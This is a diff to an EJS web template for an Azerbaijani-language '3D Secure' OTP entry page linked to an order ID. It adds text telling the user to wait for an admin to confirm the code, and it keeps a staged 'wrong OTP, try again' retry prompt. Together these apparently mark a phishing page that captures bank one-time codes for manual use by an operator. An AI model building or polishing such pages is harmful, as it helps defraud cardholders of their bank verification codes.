@@ -25,25 +25,28 @@
             <h2 style="font-size:1.15rem" data-stage-title>OTP kodu göndərildi</h2>
             <div data-stage-alert class="alert alert--error" style="display:none"></div>
             <%- include('../partials/countdown-ring') %>
-            <p class="sec-note" data-stage-note>Bank yekun təsdiqi aparır. Bu ekranı bağlamayın.</p>
+            <p class="sec-note" data-stage-note>Yekun təsdiq gözlənilir. Bu ekranı bağlamayın.</p>
             <div id="retryBox" style="display:none;margin-top:20px">
               <p class="alert alert--error"><strong>OTP kodu səhvdir!</strong> Lütfən yenidən cəhd edin.</p>
               <button type="button" id="retryBtn" class="btn btn--secondary">Yenidən Cəhd Et</button>
             </div>
           </div>
         <% } else { %>
-          <div class="alert alert--success">Bankdan göndərilən yeni OTP kodunu daxil edin.</div>
+          <div class="alert alert--success mb-16">
+            <strong>Bankdan göndərilən OTP kodunu daxil edin.</strong><br>
+            Kod 6 rəqəmdir.
+          </div>
           <div id="formNote" class="hidden"></div>
           <form id="codeForm" data-order-id="<%= order._id %>">
             <div class="field">
               <label for="code"><%= t('secure3d.code') %> (OTP)</label>
               <input type="text" id="code" name="code" class="code-input" data-code inputmode="numeric" maxlength="6" placeholder="000000" required autofocus />
+              <small class="sec-note">6 rəqəmli kodu daxil edin.</small>
             </div>
             <button type="submit" class="btn btn--primary btn--block btn--lg"><%= t('secure3d.submit') %></button>
           </form>
+          <p class="sec-note mt-16 text-center">Admin tərəfindən kod təsdiqini gözləyin…</p>
         <% } %>
-
-        <p class="sec-note mt-16 text-center"><%= t('secure3d.waiting') %></p>
       </div>
     </div>
   </div>
